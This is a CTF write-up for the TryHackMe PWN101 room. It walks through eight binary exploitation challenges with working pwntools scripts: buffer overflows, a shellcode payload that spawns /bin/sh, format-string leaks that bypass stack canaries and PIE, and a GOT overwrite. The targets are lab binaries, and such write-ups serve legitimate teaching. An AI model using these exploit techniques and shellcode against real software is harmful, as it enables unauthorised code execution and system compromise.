# Pwn101 - TryHackMe CTF Writeup

CTF link: 

[TryHackMe | PWN101](https://tryhackme.com/room/pwn101)

This medium level CTF covers these topics: 

- Buffer overflow
- Modify variable's value
- Return to win
- Return to shellcode
- Integer Overflow
- Format string exploit
- Bypassing mitigations
- GOT overwrite
- Return to PLT
- Playing with ROP

## Tools

- Python2.7 (not python3 or higher)
- Pwntools
- GDB (I am using pwndgb check ‣)
- Radare2
- IDA

# Challenge 1 - pwn101

When we execute given file which will be working on given ip’s port 9001 waits an input.

![Untitled](assets/Untitled.png)

We check gdb,  we see “$rbp-4” already set 0x539 and there checks its value. If we couldn’t change the value of “$rbp-4” program doesn’t jump to system call. We want this program jumps system call and give us “/bin/bash”. So we have to overwrite “$rbp-4” and change it to another value. “A” is good.

![Untitled](assets/Untitled%201.png)

![Untitled](assets/Untitled%202.png)

Then we do the same on server.

```bash
python -c ‘print ("A"*100)’
```

![Untitled](assets/Untitled%203.png)

# Challenge 2 - pwn102

When we execute given file which will be working on given ip’s port 9002 waits an input.

![Untitled](assets/Untitled%204.png)

We check gdb and see these two cmp processes, they compare datas already set on the beggining of dump.  If we couldn’t change the value of “$rbp-4” and “$rbp-8” program doesn’t jump to system call. We want this program jumps system call and give us “/bin/bash”. So we should overwrite rbp and change “$rbp-4” to “0x0ff33” and “$rbp-8” to “0xc0d3”.

![Untitled](assets/Untitled%205.png)

First we should see which char overflows buffer and overwrites onto rbp. We can create a string with cyclic and give it to program while we controlling processes with gdb. To do this we should create a breakpoint at first cmp.

```bash
cyclic 200
```

![Untitled](assets/Untitled%206.png)

We let run the program and gives cyclic output as input. When program hits our breakpoint we check the value of “$rbp-4”.

```nasm
x/s $rbp-4
```

```bash
cyclic -l caab
```

![Untitled](assets/Untitled%207.png)

We can understand this 108 char will fill the buffer and overwrite “$rbp-4”. But $rbp-8?

```nasm
$rbp - 4 = 108
$rbp - 8 = 104
```

So our exploit is gonna be:

```python
#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn102.pwn102'
context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
        if args.REMOTE: # Runs on remote server, usage "python2.7 code.py REMOTE ip port"
                return remote(sys.argv[1], sys.argv[2], *a, **kw)
        else: # Runs locally, usage "python2.7 code.py"
                return process([exe] + argv, *a, **kw)

exploit  = b''
exploit += b"\x90"*104 # we fill the buffer 
exploit += pack("<I", 0xc0d3) # we overwrite $rbp-8
exploit += pack("<I", 0xc0ff33) # we overwrite $rbp-4

#If you want to see what we wrote uncomment next two lines
#f = open("input.txt", "wb")
#f.write(exploit)

io = start()
io.sendline(exploit)
io.interactive()
```

We execute our python code locally and check if it works.

```bash
python2.7 code.py
```

![Untitled](assets/Untitled%208.png)

It works, now try it on the remote server.

```bash
python2.7 code.py REMOTE ip port
```

![Untitled](assets/Untitled%209.png)

# Challenge 3 - pwn103

When we execute given file which will be working on given ip’s port 9002 runs a interfice like discord server.

![Untitled](assets/Untitled%2010.png)

We check what functions included in this program with gdb and see there is a admins_only function with system call which is we looking for.

```bash
info functions
```

![Untitled](assets/Untitled%2011.png)

![Untitled](assets/Untitled%2012.png)

When we create a string with cyclic and try to inflate buffer we see 40 char is enough. Then we write our admins_only’s adress and try to exploit. It works on local but without this command line it does not work on remote server: “exploit  += p64(0x401016)”

Why? Because of MOVAPS issue. Check this writeup section to understand this. 

[DEF CON CTF Qualifier 2015: r0pbaby write-up - Peilin Ye's blog](https://ypl.coffee/r0pbaby/#section5)

To fix MOVAPS issue we have to write like this  

> “ret retgadget admins_only”
> 

instead of 

> “ret admins_only”
> 

Because MOVAPS issue you should find ret’s address from 

```bash
objdump -d ./pwn103.pwn103
```

![Untitled](assets/Untitled%2013.png)

```python
#!/usr/bin/env python

import sys
from pwn import *
from struct import *

elf = ELF('./pwn103.pwn103')

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([elf] + argv, *a, **kw)

io = start()

exploit  = b''
exploit  += b"\x90"*40
#exploit  += pack("<I", 0x401016)
#exploit  += pack("<I", 0x0000000000401554)

exploit  += p64(0x401016)
exploit  += p64(elf.symbols['admins_only'])

print(io.recv().decode('utf-8'))
io.sendline('3')
print(io.recv().decode('utf-8'))
io.sendlineafter(b"[pwner]:",exploit)
print(io.recv().decode('utf-8'))

io.interactive()
```

![Untitled](assets/Untitled%2014.png)

# Challenge 4 - pwn104

When we execute given file which will be working on given ip’s port 9004 waits an input.

![Untitled](assets/Untitled%2015.png)

What is this? We should check ghidra to understand what happens here. Probably buffer overflow. Also when we look at “checksec pwn104.pwn104” we see NX disabled.

### No eXecute (NX Bit)

The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the program as not executable, meaning that stored input or data cannot be executed as code. This is significant because it prevents attackers from being able to jump to custom shellcode that they've stored on the stack or in a global variable.

> source: [https://ctf101.org/binary-exploitation/no-execute/](https://ctf101.org/binary-exploitation/no-execute/)
> 

![Untitled](assets/Untitled%2016.png)

![Untitled](assets/Untitled%2017.png)

80 byte allocated for local_58 but at the end of the decompiled code we see that read function takes 200 byte. This gives us exploitation advantage: **buffer overflow**

When we consider that NX is disabled we can execute a shell code with buffer overflow.

We find how much character infilate the buffer. Then we write the exploit.

![Untitled](assets/Untitled%2018.png)

```python
#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn104.pwn104'
context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

# check exploit-db for shellcode https://www.exploit-db.com/exploits/46907
shellcode  = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

io = start()
io.recvuntil(b'at ') #program gives us buffer location, we skip till that part
address = io.recvline() 
bufferLocation = p64(int(address, 16))

exploit  = b''
exploit += shellcode
exploit  += b"\x90"*(88-len(shellcode))
exploit += bufferLocation

io.sendline(exploit)

io.interactive()
```

![Untitled](assets/Untitled%2019.png)

# Challenge 5 - pwn105

![Untitled](assets/Untitled%2020.png)

![Untitled](assets/Untitled%2021.png)

After some tries we got the shell

![Untitled](assets/Untitled%2022.png)

You can say you tried something and find the correct numbers. It is true but I know that simple integer overflow can be done here as we know interger has range (-2,147,483,647 to 2,147,483,647) if we give the highest value and add something to it, the sum will go to the opposite side that is negative one. 2,147,483,647 is 01111111111111111111111111111111 and it's the biggest positive number that will fit in 32 bits when using the "two's complement" notation. So when we add 1 number becomes negative.

![Untitled](assets/Untitled%2023.png)

![Untitled](assets/Untitled%2024.png)

# Challenge 6 - pwn106

![Untitled](assets/Untitled%2025.png)

We check gdb,r2 and cutter. We are looking for system call or hidden flag in stack. After wasting time with gdb and r2, cutter gives us what we want.

![Untitled](assets/Untitled%2026.png)

We see that there is redacted flag there and there is a format string vulnerability. Program takes input and directly, without controlling print it back. Here is programmer doesn’t specify format specifier we can provide our own format specifier to leak values from the stack.

![Untitled](assets/Untitled%2027.png)

Some brute force actions we found right order of hex codes and reverse unhexed values and get the flag.

```python
#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn106user.pwn106-user'
context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

payload = b"%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"

io = start()
io.recv()
io.recv()
io.sendline(payload)
output = io.recv().strip().split(b" ")[1].split(b".")
flag = ""
for word in output:
    decoded = unhex(word.decode("utf-8"))
    reverse_decoded = decoded[::-1]
    print(str(reverse_decoded.decode("utf-8")), end ="")
```

![Untitled](assets/Untitled%2028.png)

# Challenge 7 - pwn107

![Untitled](assets/Untitled%2029.png)

![Untitled](assets/Untitled%2030.png)

We see that stack canary is found, No eXecute bit enabled and also PIE is enabled. This means we have to careful about buffer overflowing and when we want to find the addresses we can not do it staticly. What I mean is we have to leak stack canary data and dynamic base address of library.

![Untitled](assets/Untitled%2031.png)

We see that canary stack protection is enabled. We have format string vulnerability, so we can leak datas on stack where return address and stack value already written. So we gonna leak canary value and bypass canary protection. But how we know where is the canary value? We check radare2:

```python
r2 pwn107.pwn107
aaa
afl
pdf @ main
```

![Untitled](assets/Untitled%2032.png)

As we can see canary value stored at @ rbp-0x8

We gonna put 2 breakpoints to vulnerable function and next one to see what is actually printing. After that we gonna run program and check the stack.

![Untitled](assets/Untitled%2033.png)

We know that rbp-0x8 is canary value so we print stack.

```python
pxr @ rsp
```

![Untitled](assets/Untitled%2034.png)

We can not copy and use canary value we found because this value changes dynamicly, we gonna leak this value. So we have to detect canary value’s location. Our canary value is located at input+7.

Also we need libc library location to detect base address of library. Offset doesn’t change, so when we get the dynamic location of libc and static location of libc we can find base address of library. And when we got the base address, we can add the static offset of get_streak function and calculate the dynamic location of get_streak function.

```python
dynamic_libc - static_libc = base address
base address + static_get_streak = dynamic_get_streak
```

We have to use these range of libc addresses because our libc function should return to the binary itself.

![Untitled](assets/Untitled%2035.png)

We found it. Our static libc location is at input+4.

![Untitled](assets/Untitled%2036.png)

Now we gonna leak input’s location and write the exploit. We are looking for 41 values in leaked datas.

![Untitled](assets/Untitled%2037.png)

![Untitled](assets/Untitled%2038.png)

```python
#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn107.pwn107'
binary = context.binary = ELF(exe,checksec=False)
static_libc_address = binary.symbols.__libc_csu_init

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
io = start()
io.recvuntil(b"streak?")

#input location = %6$p
#libc location = input+4 = %10$p
#canary location = input+7 = %13$p
payload = b""
payload += b"%10$p.%13$p" #here we leak 

io.sendline(payload)

io.recvuntil(b"streak:")

output = io.recv().split(b"\n")[0]

dynamic_libc_address = int(output.split(b".")[0].strip(), 16)
canary = int(output.split(b".")[1].strip(), 16)

dynamic_base_address = dynamic_libc_address-static_libc_address
binary.address = dynamic_base_address

dynamic_get_streak = binary.symbols.get_streak
rop = ROP(binary)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = b""
payload += b"\x90" * 0x18+ p64(canary) + b"\x90"*8 + p64(ret_gadget) + p64(dynamic_get_streak)
io.sendline(payload)
io.interactive()
```

![Untitled](assets/Untitled%2039.png)

We got it (locally), then try it on remote server (fingers crossed). And got it.

![Untitled](assets/Untitled%2040.png)

# Challenge 8 - pwn108

![Untitled](assets/Untitled%2041.png)

Here we see format string vulnerability.

![Untitled](assets/Untitled%2042.png)

Using a format string we overwrite the GOT (Global Offset Table) on a non-PIE binary.

We replace the address of puts() in the GOT with the address of the hidden function holidays().

1. We inject in the first buffer the address of puts() in the GOT
2. We use %<int>s  to make printf()  print <address of holidays()> bytes.
3. With %6$lln we overwrite the address of puts() in the GOT with the address of holidays(). We know the latter because the binary is not a PIE.
    - %6$lln writes the number of bytes written so far for the format string in the variable pointed by the positional parameter. 6 is for using the address stored in the first buffer, which points to puts() in the GOT
    

```python
#!/usr/bin/env python

import sys
from pwn import *
from struct import *

exe = './pwn108.pwn108'
binary = context.binary = ELF(exe,checksec=False)

def start(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
io = start()

puts_got = binary.got['puts']
holiday = binary.symbols['holidays']

io.recvuntil(b"name]: ")
io.sendline(p64(puts_got))

io.recvuntil(b"No]: ")
io.sendline(b"%" + str(holiday).encode("utf-8") + b"s%6$lln")

io.interactive()
```

![Untitled](assets/Untitled%2043.png)